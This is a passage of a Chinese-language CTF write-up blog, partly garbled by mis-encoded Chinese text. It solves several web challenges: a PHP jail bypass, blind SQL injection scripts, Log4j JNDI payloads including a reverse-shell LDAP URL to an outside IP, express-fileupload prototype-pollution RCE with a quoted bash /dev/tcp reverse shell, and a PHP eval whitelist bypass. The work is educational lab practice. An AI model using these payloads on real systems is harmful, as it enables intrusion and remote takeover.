åœ¨HTMLè§£æåå†è¾“å‡ºPHPæºä»£ç </span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Welcome to My Jail</span><br><span class="line">BaseCTF&#123;c110bf77-<span class="number">67</span>cc-<span class="number">4</span>fb3-<span class="number">965</span>c-<span class="number">30946</span>ac4fb0d&#125;</span><br><span class="line">Yes! you escaped <span class="keyword">from</span> the jail! LOL!</span><br></pre></td></tr></table></figure>

<p>å½“ php ç‰ˆæœ¬â¼©äº 8 æ—¶ï¼ŒGET è¯·æ±‚çš„å‚æ•°åå«æœ‰ . ï¼Œä¼šè¢«è½¬ä¸º _ ï¼Œä½†æ˜¯å¦‚æœå‚æ•°åä¸­æœ‰ [ ï¼Œè¿™</p>
<p>ä¸ª [ ä¼šè¢«ç›´æ¥è½¬ä¸º _ ï¼Œä½†æ˜¯åâ¾¯å¦‚æœæœ‰ . ï¼Œè¿™ä¸ª . å°±ä¸ä¼šè¢«è½¬ä¸º _ ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.basectf.fun:34054?Jail[by.Happy=highlight_file(glob(&quot;/f*&quot;)[0]);</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240915151656980.png" alt="image-20240915151656980"></p>
<h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p><strong>äºŒåˆ†æ³•</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bcd848ad-3ba8-4d83-87e2-c22cce3bafa5.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        mid = (letf + right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,1,2)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p><strong>å¼‚æˆ–</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> turtle <span class="keyword">import</span> right</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bcd848ad-3ba8-4d83-87e2-c22cce3bafa5.node5.buuoj.cn:81/index.php&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line">    letf = <span class="number">32</span></span><br><span class="line">    right = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> letf &lt; right:</span><br><span class="line">        mid = (letf + right) // <span class="number">2</span></span><br><span class="line">        payload = <span class="string">f&quot;0^(ascii(substr((select(flag)from(flag)),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>)&quot;</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> res:</span><br><span class="line">            letf = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            right = mid</span><br><span class="line">    <span class="keyword">if</span> letf != <span class="number">32</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(letf)</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h2 id="NSSCTF-Apache-log4jæ¼æ´é¶æœº"><a href="#NSSCTF-Apache-log4jæ¼æ´é¶æœº" class="headerlink" title="NSSCTF Apache log4jæ¼æ´é¶æœº"></a>NSSCTF Apache log4jæ¼æ´é¶æœº</h2><p>og4jæä¾›äº†${}è§£æåŠŸèƒ½ï¼Œå½“é‡åˆ°${}æ—¶ï¼Œä¼šé€šè¿‡JNDIçš„lookup()è§£æå…¶ä¸­çš„å†…å®¹ã€‚</p>
<p>å¦‚${jndi:dns:&#x2F;&#x2F;${sys:java.version}.example.com}</p>
<p>ä¼šé€šè¿‡jndiçš„lookup()è§£ædns:&#x2F;&#x2F;${sys:java.version}.example.comï¼Œè§£æåˆ°dnsåè®®ï¼Œä¼šå»è®¿é—®</p>
<p>${sys:java.version}.example.comï¼Œè€Œåˆä¼šè§£æåˆ°sysåè®®ï¼Œè·å–åˆ°java.versionå‚æ•°ï¼Œç„¶åå°†è¿™ä¸ªå‚æ•°å€¼ä½œä¸ºå­åŸŸåçš„ä¸€éƒ¨åˆ†å»è®¿é—®å­åŸŸåã€‚æˆ‘ä»¬åœ¨dns logç½‘ç«™å³å¯çœ‹åˆ°å¯¹åº”å†…å®¹ã€‚</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$&#123;jndi:dns://$&#123;sys:java.version&#125;.fpx45s.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240916210411270.png" alt="image-20240916210411270"></p>
<p>ç„¶åå°±å¯ä»¥åå¼¹shell</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=$&#123;jndi:ldap://43.129.200.87:1389/Basic/ReverseShell/43.129.200.87/12345&#125;</span><br></pre></td></tr></table></figure>

<h2 id="BadProgrammer"><a href="#BadProgrammer" class="headerlink" title="BadProgrammer"></a>BadProgrammer</h2><p>jsåŸå‹é“¾æ±¡æŸ“</p>
<p>dirsearchæ‰«å‡ºç›®å½•</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920142342242.png" alt="image-20240920142342242"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920142442859.png" alt="image-20240920142442859"></p>
<p>â€œexpress-fileuploadâ€: â€œ1.1.7-alpha.4â€</p>
<h3 id="CVE-2020-7699æ¼æ´åˆ†æ"><a href="#CVE-2020-7699æ¼æ´åˆ†æ" class="headerlink" title="CVE-2020-7699æ¼æ´åˆ†æ"></a>CVE-2020-7699æ¼æ´åˆ†æ</h3><p>è¯¥æ¼æ´å®Œå…¨æ˜¯ç”±äºNodejsçš„express-fileuploadæ¨¡å—å¼•èµ·ï¼Œè¯¥æ¨¡å—çš„1.1.8ä¹‹å‰çš„ç‰ˆæœ¬å­˜åœ¨<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8E%9F%E5%9E%8B%E9%93%BE&spm=1001.2101.3001.7020">åŸå‹é“¾</a>æ±¡æŸ“ï¼ˆPrototype Pollutionï¼‰æ¼æ´ï¼Œå½“ç„¶ï¼Œå¼•å‘è¯¥æ¼æ´ï¼Œéœ€è¦ä¸€å®šçš„é…ç½®ï¼šparseNestedé€‰é¡¹è®¾ç½®ä¸ºtrue</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/gental_z/article/details/107937110">CVE-2020-7699æ¼æ´åˆ†æ_express-fileuploadâ€: â€œ1.1.7-alpha.4-CSDNåšå®¢</a></p>
<p>æ ¸å¿ƒä»£ç </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">busboy.<span class="title function_">on</span>(<span class="string">&#x27;finish&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">debugLog</span>(options, <span class="string">`Busboy finished parsing request.`</span>);</span><br><span class="line">    <span class="keyword">if</span> (options.<span class="property">parseNested</span>) &#123;</span><br><span class="line">        req.<span class="property">body</span> = <span class="title function_">processNested</span>(req.<span class="property">body</span>);</span><br><span class="line">        req.<span class="property">files</span> = <span class="title function_">processNested</span>(req.<span class="property">files</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!req[waitFlushProperty]) <span class="keyword">return</span> <span class="title function_">next</span>();</span><br><span class="line">    <span class="title class_">Promise</span>.<span class="title function_">all</span>(req[waitFlushProperty])</span><br><span class="line">        .<span class="title function_">then</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        <span class="title function_">next</span>();</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">delete</span> req[waitFlushProperty];</span><br><span class="line">        <span class="title function_">debugLog</span>(options, <span class="string">`Error while waiting files flush: <span class="subst">$&#123;err&#125;</span>`</span>);</span><br><span class="line">        <span class="title function_">next</span>(err);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">processNested</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (!data || data.<span class="property">length</span> &lt; <span class="number">1</span>) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> d = &#123;&#125;,</span><br><span class="line">        keys = <span class="title class_">Object</span>.<span class="title function_">keys</span>(data);       <span class="comment">//è·å–é”®å,åˆ—è¡¨</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; keys.<span class="property">length</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> key = keys[i],</span><br><span class="line">            value = data[key],</span><br><span class="line">            current = d,</span><br><span class="line">            keyParts = key</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\[/g</span>), <span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="keyword">new</span> <span class="title class_">RegExp</span>(<span class="regexp">/\]/g</span>), <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        .<span class="title function_">split</span>(<span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> index = <span class="number">0</span>; index &lt; keyParts.<span class="property">length</span>; index++)&#123;</span><br><span class="line">            <span class="keyword">let</span> k = keyParts[index];</span><br><span class="line">            <span class="keyword">if</span> (index &gt;= keyParts.<span class="property">length</span> - <span class="number">1</span>)&#123;</span><br><span class="line">                current[k] = value;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!current[k]) </span><br><span class="line">                    current[k] = !<span class="built_in">isNaN</span>(keyParts[index + <span class="number">1</span>]) ? [] : &#123;&#125;;</span><br><span class="line">                current = current[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>porcessNestedæ–¹æ³•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ä¼ å…¥çš„å‚æ•°æ˜¯:&#123;&quot;a.b.c&quot;:&quot;m1sn0w&quot;&#125;</span><br><span class="line">é€šè¿‡è¿™ä¸ªå‡½æ•°åï¼Œè¿”å›çš„æ˜¯&quot;&#123; a: &#123; b: &#123; c: &#x27;m1sn0w&#x27; &#125; &#125; &#125;</span><br><span class="line"></span><br><span class="line">å…¶å®ä»–è·Ÿé‚£ä¸ªmergeå‡½æ•°æ¯”è¾ƒç±»ä¼¼ï¼Œéƒ½æ˜¯å¾ªç¯è°ƒç”¨ï¼Œå› æ­¤å­˜åœ¨åŸå‹é“¾æ±¡æŸ“</span><br><span class="line">ä¼ å…¥å‚æ•°:&#123;&quot;__proto__.m1sn0w&quot;:&quot;m1sn0w&quot;&#125;</span><br><span class="line">ç„¶åæˆ‘ä»¬è°ƒç”¨console.log(Object.__proto__.m1sn0w)</span><br><span class="line">è¿”å›çš„å€¼ä¸ºm1sn0w</span><br></pre></td></tr></table></figure>

<p>å·²æœ‰poc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c &quot;bash -i &amp;&gt; /dev/tcp/ip/prot 0&gt;&amp;1&quot;&#x27;);x</span><br></pre></td></tr></table></figure>

<p>æ”¹æˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cp /flag.txt /app/static/js/flag.txt&#x27;);x</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920143415320.png" alt="image-20240920143415320"></p>
<p>å‘åŒ…</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /4_pATh_y0u_CaNN07_Gu3ss HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:53665</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: PHPSESSID=g7o49fe11l2q7bo3536cbjt2f0</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 163</span><br><span class="line"></span><br><span class="line">Content-Disposition: form-data; name=&quot;__proto__.outputFunctionName&quot;</span><br><span class="line"></span><br><span class="line">x;process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;cp /flag.txt /app/static/js/flag.txt&#x27;);x</span><br></pre></td></tr></table></figure>

<p>è„šæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">resp1 = requests.post(&quot;http://&#123;&#125;:&#123;&#125;/&#123;&#125;&quot;.format(&#x27;61.147.171.105&#x27;, &#x27;52139&#x27;, &#x27;4_pATh_y0u_CaNN07_Gu3ss&#x27;),</span><br><span class="line">        files=&#123;&#x27;__proto__.outputFunctionName&#x27;: </span><br><span class="line">        (</span><br><span class="line">            None, &quot;x;console.log(1);process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;&#123;cmd&#125;&#x27;);x&quot;.format(cmd=&#x27;cp /flag.txt /app/static/js/flag.txt&#x27;)</span><br><span class="line">        )&#125;)</span><br><span class="line"></span><br><span class="line">print(resp1)</span><br></pre></td></tr></table></figure>

<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920143438224.png" alt="image-20240920143438224"></p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920143535006.png" alt="image-20240920143535006"></p>
<h2 id="CISCN-2019-åˆèµ›-Love-Math"><a href="#CISCN-2019-åˆèµ›-Love-Math" class="headerlink" title="[CISCN 2019 åˆèµ›]Love Math"></a>[CISCN 2019 åˆèµ›]Love Math</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//å¬è¯´ä½ å¾ˆå–œæ¬¢æ•°å­¦ï¼Œä¸çŸ¥é“ä½ æ˜¯å¦çˆ±å®ƒèƒœè¿‡çˆ±flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//ä¾‹å­ c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¤ªé•¿äº†ä¸ä¼šç®—&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å­—ç¬¦&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸¸ç”¨æ•°å­¦å‡½æ•°http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;è¯·ä¸è¦è¾“å…¥å¥‡å¥‡æ€ªæ€ªçš„å‡½æ•°&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//å¸®ä½ ç®—å‡ºç­”æ¡ˆ</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="æ³•ä¸€"><a href="#æ³•ä¸€" class="headerlink" title="æ³•ä¸€"></a>æ³•ä¸€</h3><p>phpä¸­å¯ä»¥æŠŠå‡½æ•°åé€šè¿‡å­—ç¬¦ä¸²çš„æ–¹å¼ä¼ é€’ç»™ä¸€ä¸ªå˜é‡ï¼Œç„¶åé€šè¿‡æ­¤å˜é‡åŠ¨æ€è°ƒç”¨å‡½æ•°æ¯”å¦‚ä¸‹é¢çš„ä»£ç ä¼šæ‰§è¡Œ system(â€˜cat&#x2F;flagâ€™);</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;system&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>(<span class="string">&#x27;cat/flag&#x27;</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat /flag</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯æƒ³åŠæ³•ç»•è¿‡é»‘åå•</p>
<p>hex2bin() å‡½æ•°æŠŠåå…­è¿›åˆ¶å€¼çš„å­—ç¬¦ä¸²è½¬æ¢ä¸º ASCII å­—ç¬¦ã€‚ã€</p>
<p>base_convert() å‡½æ•°åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—ã€‚</p>
<p>hex2bin()å‡½æ•°å¯ä»¥é€šè¿‡base_convert()å‡½æ•°æ¥è¿›è¡Œè½¬æ¢</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920144533963.png" alt="image-20240920144533963"></p>
<p>é‚£ä¹ˆå°±å¯ä»¥æŠŠå­—ç¬¦è½¬åŒ–ä¸ºæ•°å­—</p>
<p>hex2bin&#x3D;base_convert(37907361743,10,36)</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920144955368.png" alt="image-20240920144955368"></p>
<p>dechex() å‡½æ•°æŠŠåè¿›åˆ¶æ•°è½¬æ¢ä¸ºåå…­è¿›åˆ¶æ•°ã€‚</p>
<p>å°±å°†getæ„é€ å®Œæ¯•äº†</p>
<p><img src="https://yiyyyyi.oss-cn-beijing.aliyuncs.com/img/image-20240920145308936.png" alt="image-20240920145308936"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

